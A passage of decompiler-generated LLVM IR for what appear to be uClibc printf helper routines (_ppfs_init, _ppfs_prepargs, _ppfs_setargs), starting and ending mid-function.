dec_label_pc_10a98:                               ; preds = %dec_label_pc_10920, %dec_label_pc_107a4, %dec_label_pc_10a6c, %dec_label_pc_109ec, %dec_label_pc_109b0, %dec_label_pc_10994, %dec_label_pc_108e8, %dec_label_pc_107cc, %dec_label_pc_10744, %bb142, %dec_label_pc_10a3c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_10aa0

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_104f4, %bb, %dec_label_pc_10438, %dec_label_pc_10a98
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10438 ], [ -1, %dec_label_pc_10a98 ], [ %v1_10970, %dec_label_pc_104f4 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_103e8, i32* @r5, align 4
  store i32 %v12_103e8, i32* %r7.global-to-local, align 4
  store i32 %v18_103e8, i32* @sb, align 4
  store i32 %v21_103e8, i32* @sl, align 4
  store i32 %v24_103e8, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_10a90, { 1, 0 }
  uselistorder i32 %v3_10a84, { 1, 2, 0 }
  uselistorder i32 %v2_10a54, { 1, 2, 0 }
  uselistorder i32 %v0_1099c, { 1, 0 }
  uselistorder i32 %v2_10984, { 2, 0, 1 }
  uselistorder i1 %v9_10960, { 1, 0 }
  uselistorder i32 %v2_10944, { 1, 0 }
  uselistorder i32 %v0_1098c, { 1, 0 }
  uselistorder i32 %v0_10944, { 1, 0 }
  uselistorder i32 %v1_10920, { 1, 0 }
  uselistorder i32 %v1_108e8, { 1, 0, 2 }
  uselistorder i32 %v3_108b8, { 1, 2, 0 }
  uselistorder i32 %v0_10824, { 1, 0 }
  uselistorder i32 %v2_10814, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_107dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_10754, { 1, 0 }
  uselistorder i32 %v2_106b4, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_106d0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10650, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_105b8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1055c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_10554, { 1, 0 }
  uselistorder i32 %v1_10500, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10970, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_104c0, { 1, 0 }
  uselistorder i32 %v1_104b8.lcssa, { 1, 0 }
  uselistorder i8 %v2_104a4, { 1, 0 }
  uselistorder i32 %v2_104b8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_104d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_105d8, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_106c8, { 1, 0 }
  uselistorder i1 %v7_10618, { 1, 2, 0 }
  uselistorder i1 %v7_10804, { 1, 0 }
  uselistorder i1 %v7_1077c, { 1, 0 }
  uselistorder i1 %v7_10658, { 1, 0 }
  uselistorder i32 %v2_107b4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_107a8, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_108ac, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_10558, { 1, 3, 2, 0 }
  uselistorder i32 %v4_10534, { 1, 0 }
  uselistorder i32 %v2_103f0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 8, 7, 9, 11, 10, 16, 12, 13, 14, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 32, 30, 31, 35, 36, 33, 34, 46, 37, 47, 48, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -91504), { 1, 0 }
  uselistorder label %dec_label_pc_10aa0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10a98, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_10a20, { 1, 0 }
  uselistorder label %dec_label_pc_109b0, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
  uselistorder label %dec_label_pc_10940, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10940thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10868, { 1, 0 }
  uselistorder label %dec_label_pc_10820, { 1, 0 }
  uselistorder label %dec_label_pc_10734, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_10608, { 1, 0 }
  uselistorder label %dec_label_pc_10604, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10550, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_104f4, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_104c0, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_104a4.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10ad0 = load i32, i32* @r4, align 4
  %v6_10ad0 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10adc = load i32, i32* @r1, align 4
  store i32 %v0_10adc, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_10ae8 = bitcast i32* %arg1 to i8*
  %v3_10ae8 = call i32 @__GI_memset(i8* %v2_10ae8, i32 0)
  store i32 %v3_10ae8, i32* %r0.global-to-local, align 4
  %v0_10aec = load i32, i32* @r4, align 4
  %v1_10aec = add i32 %v0_10aec, 24
  %v2_10aec = inttoptr i32 %v1_10aec to i32*
  %v3_10aec = load i32, i32* %v2_10aec, align 4
  store i32 %v3_10aec, i32* %r3.global-to-local, align 4
  %v0_10af0 = load i32, i32* @r5, align 4
  %v2_10af0 = inttoptr i32 %v0_10aec to i32*
  store i32 %v0_10af0, i32* %v2_10af0, align 4
  %v0_10af4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10af4 = add i32 %v0_10af4, -1
  %v1_10af8 = load i32, i32* @r4, align 4
  %v2_10af8 = add i32 %v1_10af8, 24
  %v3_10af8 = inttoptr i32 %v2_10af8 to i32*
  store i32 %v1_10af4, i32* %v3_10af8, align 4
  %v0_10afc = load i32, i32* @r4, align 4
  %v1_10afc = add i32 %v0_10afc, 40
  store i32 %v1_10afc, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_10b0c21 = inttoptr i32 %v1_10afc to i32*
  store i32 8, i32* %v2_10b0c21, align 4
  %v3_10b0c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_10b0c23 = add i32 %v3_10b0c22, 4
  store i32 %v4_10b0c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge

dec_label_pc_10b08.dec_label_pc_10b08_crit_edge:  ; preds = %entry, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge
  %v4_10b0c24 = phi i32 [ %v4_10b0c23, %entry ], [ %v4_10b0c, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge ]
  %v0_10b08.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10b0c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10b08 = add i32 %v0_10b08.pre, -1
  store i32 %v1_10b08, i32* %r3.global-to-local, align 4
  %v7_10b08 = icmp eq i32 %v0_10b08.pre, 1
  %v2_10b0c = inttoptr i32 %v4_10b0c24 to i32*
  store i32 %v0_10b0c.pre, i32* %v2_10b0c, align 4
  %v3_10b0c = load i32, i32* %r2.global-to-local, align 4
  %v4_10b0c = add i32 %v3_10b0c, 4
  store i32 %v4_10b0c, i32* %r2.global-to-local, align 4
  br i1 %v7_10b08, label %dec_label_pc_10b14, label %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge
  %v0_10b14 = load i32, i32* @r5, align 4
  store i32 %v0_10b14, i32* %r2.global-to-local, align 4
  %v1_10b542 = inttoptr i32 %v0_10b14 to i8*
  %v2_10b543 = load i8, i8* %v1_10b542, align 1
  %v3_10b544 = zext i8 %v2_10b543 to i32
  store i32 %v3_10b544, i32* %r0.global-to-local, align 4
  %v2_10b585 = icmp eq i8 %v2_10b543, 0
  br i1 %v2_10b585, label %dec_label_pc_10b60, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10b14, %dec_label_pc_10b54.backedge
  %v0_10b24 = phi i32 [ %storemerge, %dec_label_pc_10b54.backedge ], [ %v0_10b14, %dec_label_pc_10b14 ]
  %v0_10b1c = phi i32 [ %v3_10b54, %dec_label_pc_10b54.backedge ], [ %v3_10b544, %dec_label_pc_10b14 ]
  %v7_10b1c = icmp eq i32 %v0_10b1c, 37
  br i1 %v7_10b1c, label %dec_label_pc_10b24, label %dec_label_pc_10b50

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b1c
  %v1_10b24 = add i32 %v0_10b24, 1
  %v2_10b24 = inttoptr i32 %v1_10b24 to i8*
  %v3_10b24 = load i8, i8* %v2_10b24, align 1
  %v4_10b24 = zext i8 %v3_10b24 to i32
  store i32 %v4_10b24, i32* %r3.global-to-local, align 4
  store i32 %v1_10b24, i32* %r2.global-to-local, align 4
  %v7_10b28 = icmp eq i8 %v3_10b24, 37
  br i1 %v7_10b28, label %dec_label_pc_10b50, label %dec_label_pc_10b30

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b24
  %v1_10b30 = load i32, i32* @r4, align 4
  %v2_10b30 = inttoptr i32 %v1_10b30 to i32*
  store i32 %v1_10b24, i32* %v2_10b30, align 4
  %v0_10b34 = load i32, i32* @r4, align 4
  store i32 %v0_10b34, i32* %r0.global-to-local, align 4
  %v1_10b38 = inttoptr i32 %v0_10b34 to i8*
  %v2_10b38 = call i32 @_ppfs_parsespec(i8* %v1_10b38)
  store i32 %v2_10b38, i32* %r0.global-to-local, align 4
  %v1_10b3c = icmp slt i32 %v2_10b38, 0
  br i1 %v1_10b3c, label %dec_label_pc_10b64.loopexit, label %dec_label_pc_10b48

dec_label_pc_10b48:                               ; preds = %dec_label_pc_10b30
  %v0_10b48 = load i32, i32* @r4, align 4
  %v1_10b48 = inttoptr i32 %v0_10b48 to i32*
  %v2_10b48 = load i32, i32* %v1_10b48, align 4
  br label %dec_label_pc_10b54.backedge

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b1c, %dec_label_pc_10b24
  %v0_10b50 = phi i32 [ %v0_10b24, %dec_label_pc_10b1c ], [ %v1_10b24, %dec_label_pc_10b24 ]
  %v1_10b50 = add i32 %v0_10b50, 1
  br label %dec_label_pc_10b54.backedge

dec_label_pc_10b54.backedge:                      ; preds = %dec_label_pc_10b50, %dec_label_pc_10b48
  %storemerge = phi i32 [ %v1_10b50, %dec_label_pc_10b50 ], [ %v2_10b48, %dec_label_pc_10b48 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_10b54 = inttoptr i32 %storemerge to i8*
  %v2_10b54 = load i8, i8* %v1_10b54, align 1
  %v3_10b54 = zext i8 %v2_10b54 to i32
  store i32 %v3_10b54, i32* %r0.global-to-local, align 4
  %v2_10b58 = icmp eq i8 %v2_10b54, 0
  br i1 %v2_10b58, label %dec_label_pc_10b54.dec_label_pc_10b60_crit_edge, label %dec_label_pc_10b1c

dec_label_pc_10b54.dec_label_pc_10b60_crit_edge:  ; preds = %dec_label_pc_10b54.backedge
  %v0_10b60.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10b60

dec_label_pc_10b60:                               ; preds = %dec_label_pc_10b54.dec_label_pc_10b60_crit_edge, %dec_label_pc_10b14
  %v0_10b60 = phi i32 [ %v0_10b60.pre, %dec_label_pc_10b54.dec_label_pc_10b60_crit_edge ], [ %v0_10b14, %dec_label_pc_10b14 ]
  %v1_10b60 = load i32, i32* @r4, align 4
  %v2_10b60 = inttoptr i32 %v1_10b60 to i32*
  store i32 %v0_10b60, i32* %v2_10b60, align 4
  %v1_10b6c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b64

dec_label_pc_10b64.loopexit:                      ; preds = %dec_label_pc_10b30
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b64

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10b64.loopexit, %dec_label_pc_10b60
  %v1_10b6c = phi i32 [ -1, %dec_label_pc_10b64.loopexit ], [ %v1_10b6c.pre, %dec_label_pc_10b60 ]
  store i32 %v3_10ad0, i32* @r4, align 4
  store i32 %v6_10ad0, i32* @r5, align 4
  ret i32 %v1_10b6c

; uselistorder directives
  uselistorder i32 %v3_10b54, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10b14, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10b0c, { 1, 0 }
  uselistorder i32 %v0_10b08.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_10b50, { 1, 0 }
  uselistorder label %dec_label_pc_10b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10b70 = load i32, i32* @r4, align 4
  store i32 %v3_10b70, i32* %stack_var_-12, align 4
  %v0_10b74 = load i32, i32* @r0, align 4
  %v1_10b74 = add i32 %v0_10b74, 24
  %v2_10b74 = inttoptr i32 %v1_10b74 to i32*
  %v3_10b74 = load i32, i32* %v2_10b74, align 4
  store i32 %v3_10b74, i32* %r5.global-to-local, align 4
  store i32 %v0_10b74, i32* @r4, align 4
  %v2_10b84 = add i32 %v0_10b74, 76
  %v3_10b84 = inttoptr i32 %v2_10b84 to i32*
  store i32 %arg2, i32* %v3_10b84, align 4
  %tmp5 = icmp slt i32 %v3_10b74, 1
  br i1 %tmp5, label %dec_label_pc_10ba8, label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10b90 = load i32, i32* @r0, align 4
  %v2_10b90 = add i32 %v1_10b90, 8
  %v3_10b90 = inttoptr i32 %v2_10b90 to i32*
  store i32 0, i32* %v3_10b90, align 4
  %v0_10b94 = load i32, i32* %r5.global-to-local, align 4
  %v1_10b94 = load i32, i32* @r0, align 4
  %v2_10b94 = add i32 %v1_10b94, 28
  %v3_10b94 = inttoptr i32 %v2_10b94 to i32*
  store i32 %v0_10b94, i32* %v3_10b94, align 4
  %v0_10b98 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b98 = load i32, i32* @r0, align 4
  %v2_10b98 = add i32 %v1_10b98, 24
  %v3_10b98 = inttoptr i32 %v2_10b98 to i32*
  store i32 %v0_10b98, i32* %v3_10b98, align 4
  %v0_10b9c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b9c = load i32, i32* @r0, align 4
  %v2_10b9c = add i32 %v1_10b9c, 4
  %v3_10b9c = inttoptr i32 %v2_10b9c to i32*
  store i32 %v0_10b9c, i32* %v3_10b9c, align 4
  %v0_10ba0 = call i32 @_ppfs_setargs()
  store i32 %v0_10ba0, i32* @r0, align 4
  %v0_10ba4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10ba4 = load i32, i32* @r4, align 4
  %v2_10ba4 = add i32 %v1_10ba4, 24
  %v3_10ba4 = inttoptr i32 %v2_10ba4 to i32*
  store i32 %v0_10ba4, i32* %v3_10ba4, align 4
  br label %dec_label_pc_10ba8

dec_label_pc_10ba8:                               ; preds = %entry, %dec_label_pc_10b8c
  %v2_10bac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10bac, i32* @r4, align 4
  %v1_10bb0 = load i32, i32* @r0, align 4
  ret i32 %v1_10bb0

; uselistorder directives
  uselistorder i32 %v0_10b74, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10ba8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10bb4 = load i32, i32* @r0, align 4
  %v1_10bb4 = add i32 %v0_10bb4, 24
  %v2_10bb4 = inttoptr i32 %v1_10bb4 to i32*
  %v3_10bb4 = load i32, i32* %v2_10bb4, align 4
  store i32 %v3_10bb4, i32* %r1.global-to-local, align 4
  %v2_10bb8 = icmp eq i32 %v3_10bb4, 0
  %v3_10bbc = load i32, i32* @r4, align 4
  store i32 %v3_10bbc, i32* %stack_var_-8, align 4
  %v1_10bc0 = add i32 %v0_10bb4, 8
  %v2_10bc0 = inttoptr i32 %v1_10bc0 to i32*
  %v3_10bc0 = load i32, i32* %v2_10bc0, align 4
  store i32 %v3_10bc0, i32* %r3.global-to-local, align 4
  %v6_10bc8 = icmp eq i32 %v3_10bc0, -2147483648
  br i1 %v2_10bb8, label %dec_label_pc_10bc8, label %dec_label_pc_10d00

dec_label_pc_10bc8:                               ; preds = %entry
  br i1 %v6_10bc8, label %dec_label_pc_10bd0, label %dec_label_pc_10be8

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bc8
  %v1_10bd0 = add i32 %v0_10bb4, 76
  %v2_10bd0 = inttoptr i32 %v1_10bd0 to i32*
  %v3_10bd0 = load i32, i32* %v2_10bd0, align 4
  store i32 %v3_10bd0, i32* %r3.global-to-local, align 4
  %v1_10bd4 = inttoptr i32 %v3_10bd0 to i32*
  %v2_10bd4 = load i32, i32* %v1_10bd4, align 4
  store i32 %v2_10bd4, i32* %r2.global-to-local, align 4
  %v1_10bd8 = add i32 %v3_10bd0, 4
  store i32 %v1_10bd8, i32* %r3.global-to-local, align 4
  store i32 %v1_10bd8, i32* %v2_10bd0, align 4
  %v0_10be0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10be0 = load i32, i32* @r0, align 4
  %v2_10be0 = add i32 %v1_10be0, 8
  %v3_10be0 = inttoptr i32 %v2_10be0 to i32*
  store i32 %v0_10be0, i32* %v3_10be0, align 4
  %v0_10be4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10be4 = load i32, i32* @r0, align 4
  %v2_10be4 = add i32 %v1_10be4, 80
  %v3_10be4 = inttoptr i32 %v2_10be4 to i32*
  store i32 %v0_10be4, i32* %v3_10be4, align 4
  %v0_10be8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bc8, %dec_label_pc_10bd0
  %v1_10c04 = phi i32 [ %v0_10bb4, %dec_label_pc_10bc8 ], [ %v0_10be8.pre, %dec_label_pc_10bd0 ]
  %v1_10be8 = add i32 %v1_10c04, 4
  %v2_10be8 = inttoptr i32 %v1_10be8 to i32*
  %v3_10be8 = load i32, i32* %v2_10be8, align 4
  store i32 %v3_10be8, i32* %r3.global-to-local, align 4
  %v6_10bec = icmp eq i32 %v3_10be8, -2147483648
  %v1_10bf0 = add i32 %v1_10c04, 80
  store i32 %v1_10bf0, i32* %ip.global-to-local, align 4
  br i1 %v6_10bec, label %dec_label_pc_10bf8, label %dec_label_pc_10c10

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10be8
  %v1_10bf8 = add i32 %v1_10c04, 76
  %v2_10bf8 = inttoptr i32 %v1_10bf8 to i32*
  %v3_10bf8 = load i32, i32* %v2_10bf8, align 4
  store i32 %v3_10bf8, i32* %r3.global-to-local, align 4
  %v1_10bfc = inttoptr i32 %v3_10bf8 to i32*
  %v2_10bfc = load i32, i32* %v1_10bfc, align 4
  store i32 %v2_10bfc, i32* %r2.global-to-local, align 4
  %v1_10c00 = add i32 %v3_10bf8, 4
  store i32 %v1_10c00, i32* %r3.global-to-local, align 4
  store i32 %v1_10c00, i32* %v2_10bf8, align 4
  %v0_10c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c08 = load i32, i32* @r0, align 4
  %v2_10c08 = add i32 %v1_10c08, 4
  %v3_10c08 = inttoptr i32 %v2_10c08 to i32*
  store i32 %v0_10c08, i32* %v3_10c08, align 4
  %v0_10c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10c0c = load i32, i32* @r0, align 4
  %v2_10c0c = add i32 %v1_10c0c, 80
  %v3_10c0c = inttoptr i32 %v2_10c0c to i32*
  store i32 %v0_10c0c, i32* %v3_10c0c, align 4
  %v0_10cf017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10be8, %dec_label_pc_10bf8
  %v0_10cf017 = phi i32 [ %v1_10c04, %dec_label_pc_10be8 ], [ %v0_10cf017.pre, %dec_label_pc_10bf8 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_10c14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10c14, i32* %lr.global-to-local, align 4
  %v1_10cf018 = add i32 %v0_10cf017, 28
  %v2_10cf019 = inttoptr i32 %v1_10cf018 to i32*
  %v3_10cf020 = load i32, i32* %v2_10cf019, align 4
  store i32 %v3_10cf020, i32* %r3.global-to-local, align 4
  %v5_10cf822 = icmp slt i32 %v0_10c14, %v3_10cf020
  br i1 %v5_10cf822, label %dec_label_pc_10c1c, label %dec_label_pc_10cfc.loopexit

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10cf0.backedge
  %v0_10cf024 = phi i32 [ %v0_10cf0, %dec_label_pc_10cf0.backedge ], [ %v0_10cf017, %dec_label_pc_10c10 ]
  %v0_10c2823 = phi i32 [ %v0_10c28.be, %dec_label_pc_10cf0.backedge ], [ %v0_10c14, %dec_label_pc_10c10 ]
  %v4_10c1c = mul i32 %v0_10c2823, 4
  %v5_10c1c = add i32 %v4_10c1c, %v0_10cf024
  store i32 %v5_10c1c, i32* %r3.global-to-local, align 4
  %v1_10c20 = add i32 %v5_10c1c, 40
  %v2_10c20 = inttoptr i32 %v1_10c20 to i32*
  %v3_10c20 = load i32, i32* %v2_10c20, align 4
  store i32 %v3_10c20, i32* %r3.global-to-local, align 4
  %v7_10c24 = icmp eq i32 %v3_10c20, 8
  %v1_10c28 = add i32 %v0_10c2823, 1
  store i32 %v1_10c28, i32* %lr.global-to-local, align 4
  br i1 %v7_10c24, label %dec_label_pc_10cf0.backedge, label %dec_label_pc_10c30

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10c1c
  %v1_10c30 = add i32 %v0_10cf024, 76
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  %v3_10c30 = load i32, i32* %v2_10c30, align 4
  store i32 %v3_10c30, i32* %r1.global-to-local, align 4
  %v8_10c34 = icmp sgt i32 %v3_10c20, 8
  br i1 %v8_10c34, label %dec_label_pc_10c58, label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c30
  %v7_10c38 = icmp eq i32 %v3_10c20, 2
  br i1 %v7_10c38, label %dec_label_pc_10ca8, label %dec_label_pc_10c40

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c38
  %v8_10c40 = icmp sgt i32 %v3_10c20, 2
  br i1 %v8_10c40, label %dec_label_pc_10c50, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c40
  %v1_10c44 = icmp slt i32 %v3_10c20, 0
  br i1 %v1_10c44, label %dec_label_pc_10cdc, label %dec_label_pc_10ca8

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c40
  %v7_10c50 = icmp eq i32 %v3_10c20, 7
  br i1 %v7_10c50, label %dec_label_pc_10cbc, label %dec_label_pc_10cdc

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c30
  %v7_10c58 = icmp eq i32 %v3_10c20, 1024
  br i1 %v7_10c58, label %dec_label_pc_10ca8, label %dec_label_pc_10c60

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c58
  %v8_10c60 = icmp sgt i32 %v3_10c20, 1024
  br i1 %v8_10c60, label %dec_label_pc_10c78, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c60
  switch i32 %v3_10c20, label %dec_label_pc_10cdc [
    i32 256, label %dec_label_pc_10ca8
    i32 512, label %dec_label_pc_10ca8
  ]

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c60
  %v7_10c78 = icmp eq i32 %v3_10c20, 2048
  br i1 %v7_10c78, label %dec_label_pc_10c8c, label %dec_label_pc_10c84

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c78
  %v1_10c80 = load i32, i32* %r4.global-to-local, align 4
  %v9_10c80 = icmp eq i32 %v3_10c20, %v1_10c80
  br i1 %v9_10c80, label %dec_label_pc_10cbc, label %dec_label_pc_10cdc

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10c78
  %v1_10c8c = add i32 %v3_10c30, 7
  %v1_10c90 = and i32 %v1_10c8c, -8
  store i32 %v1_10c90, i32* %r3.global-to-local, align 4
  %v1_10c94 = inttoptr i32 %v1_10c90 to i32*
  %v2_10c94 = load i32, i32* %v1_10c94, align 8
  store i32 %v2_10c94, i32* %r1.global-to-local, align 4
  %v3_10c94 = or i32 %v1_10c90, 4
  %v4_10c94 = inttoptr i32 %v3_10c94 to i32*
  %v5_10c94 = load i32, i32* %v4_10c94, align 4
  store i32 %v5_10c94, i32* %r2.global-to-local, align 4
  %v1_10c98 = add i32 %v1_10c90, 8
  store i32 %v1_10c98, i32* %r3.global-to-local, align 4
  store i32 %v1_10c98, i32* %v2_10c30, align 4
  %v0_10ca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_10ca0 = inttoptr i32 %v0_10ca0 to i32*
  %v2_10ca0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10ca0, i32* %v1_10ca0, align 4
  %v3_10ca0 = add i32 %v0_10ca0, 4
  %v4_10ca0 = inttoptr i32 %v3_10ca0 to i32*
  %v5_10ca0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10ca0, i32* %v4_10ca0, align 4
  br label %dec_label_pc_10cec

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c64, %dec_label_pc_10c44, %dec_label_pc_10c58, %dec_label_pc_10c38
  %v1_10ca8 = inttoptr i32 %v3_10c30 to i32*
  %v2_10ca8 = load i32, i32* %v1_10ca8, align 4
  store i32 %v2_10ca8, i32* %r2.global-to-local, align 4
  %v1_10cac = add i32 %v3_10c30, 4
  store i32 %v1_10cac, i32* %r3.global-to-local, align 4
  store i32 %v1_10cac, i32* %v2_10c30, align 4
  %v0_10cb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_10cb4 = inttoptr i32 %v1_10cb4 to i32*
  store i32 %v0_10cb4, i32* %v2_10cb4, align 4
  br label %dec_label_pc_10cec

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10c50, %dec_label_pc_10c84
  %v3_10cbc = load i32, i32* %v2_10c30, align 4
